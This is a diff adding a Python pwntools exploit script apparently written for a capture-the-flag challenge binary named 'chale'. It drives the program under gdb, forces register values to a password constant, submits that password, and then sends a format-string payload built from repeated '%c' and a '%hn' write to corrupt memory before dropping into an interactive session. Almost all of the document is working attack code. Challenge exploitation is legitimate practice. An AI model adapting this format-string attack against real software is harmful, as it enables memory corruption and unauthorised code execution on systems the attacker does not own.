@@ -1,0 +1,51 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+import signal
+def handle(signum, frame):
+    import os
+    print("killall gdb...")
+    os.system("killall gdb")
+    exit()
+signal.signal(signal.SIGINT, handle)
+exe = ELF("./chale")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+context.terminal = ["foot"]
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    bb 0000000000001421
+    c
+    set $eax = 0x410e976a
+    set $edx = 0x410e976a
+    bb 0000000000001505
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+offs = 280
+gdbs()
+sla("==========","2")
+sla("assword",str(0x410e976a))
+sla("==========","1")
+sla("assword","%c"*(offs-2)+f"%{81-offs+2}c%hn")
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
